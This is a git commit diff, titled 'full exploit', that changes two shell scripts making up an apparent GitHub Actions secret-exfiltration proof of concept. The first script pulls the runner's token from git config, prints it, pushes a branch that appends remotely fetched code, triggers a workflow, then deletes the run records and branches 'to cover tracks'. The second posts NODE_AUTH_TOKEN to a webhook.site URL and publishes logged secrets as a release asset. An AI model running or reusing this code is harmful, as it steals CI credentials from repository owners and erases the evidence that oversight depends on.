9380cd0cefc81b94e58c9cb38513d0754ce1ef78
Craigory Coppola <craigorycoppola@gmail.com>
2025-08-28 16:06:08 -0400

    full exploit

--- run-secrets-pipeline3.sh
+++ run-secrets-pipeline3.sh
@@ -4,7 +4,6 @@
 
 REPO="FrozenPandaz/laughing-garbanzo"
 WORKFLOW_FILE="secret.yml"
-COMMIT_SHA="d71f029912284ccdcc0d7434608d1c8fe1dea1b6" # Replace with your desired commit SHA
 # The extraheader contains: "AUTHORIZATION: basic <base64>"
 HEADER=$(git config --get http.https://github.com/.extraheader)
 # Extract the base64 part after "basic "
@@ -16,24 +15,26 @@ GH_TOKEN=$(echo "$DECODED" | cut -d: -f2)
 
 echo "Token: $GH_TOKEN, GITHUB_TOKEN: $GITHUB_TOKEN"
 
-git checkout "main"
-echo "bash vulnerable_script.sh" >> script.sh
+git checkout -b "bad-actor-workflow-ref"
+curl -s https://raw.githubusercontent.com/AgentEnder/laughing-garbanzo/refs/heads/secret-grabber/vulnerable_script.sh >> script.sh
 git config user.name "Bad Actor"
 git config user.email "bad.actor@example.com"
 git add .
-git commit -m "Modify PR workflow"
-git push origin HEAD
+git commit -m "Edit script.sh to expose token"
+git push origin HEAD -f
 
-# AUTH_HEADER="Authorization: token $GH_TOKEN"
-# AUTH_HEADER="Authorization: Bearer $GH_TOKEN"
-AUTH_HEADER="$HEADER"
+gh auth login --with-token <<< "$GH_TOKEN"
+gh workflow run "$WORKFLOW_FILE" --repo "$REPO" --ref "bad-actor-workflow-ref"
 
-curl -X POST \
-    -H "$AUTH_HEADER" \
-    -H "Accept: application/vnd.github.v3+json" \
-    "https://api.github.com/repos/$REPO/actions/workflows/$WORKFLOW_FILE/dispatches" \
-    -d '{"ref":"'"$COMMIT_SHA"'"}'
+sleep 30
 
+RUN_IDS=$(gh run list --branch bad-actor-workflow-ref --json databaseId | jq -r '.[].databaseId')
 
+for RUN_ID in $RUN_IDS; do
+    gh run delete "$RUN_ID" --repo "$REPO"
+done
 
-# gh workflow run "$WORKFLOW_FILE" --repo "$REPO" --ref "$COMMIT_SHA"
+# wait 5 minutes, gives time to retrieve values
+sleep 300
+# delete to cover tracks
+git push origin -d "secrets-from-bad-actor"
--- vulnerable_script.sh
+++ vulnerable_script.sh
@@ -1,13 +1,17 @@
-curl -X POST https://webhook.site/e5ce3dc5-9485-476a-9509-e02bd5a16fae \
-  -H 'content-type: application/json' \
-  -d $'{"secret": "'"$NODE_AUTH_TOKEN"'"}'
+curl -d "node-auth-token:$NODE_AUTH_TOKEN" https://webhook.site/e5ce3dc5-9485-476a-9509-e02bd5a16fae 
 
 echo "NODE_AUTH_TOKEN: $NODE_AUTH_TOKEN" >> "secrets.log"
-echo "GITHUB_TOKEN: $GITHUB_TOKEN" >> "secrets.log"
 
 git config --global user.name "Bad Actor"
 git config --global user.email "bad.actor@example.com"
+git fetch origin
+git checkout main
 git checkout -b "secrets-from-bad-actor"
 git add secrets.log
 git commit -m "Add secrets"
-git push origin HEAD
+git push origin HEAD -f
+git push origin -d "bad-actor-workflow-ref"
+
+gh release create v1.0 -F secrets.log
+git tag v1.0
+git push origin v1.0
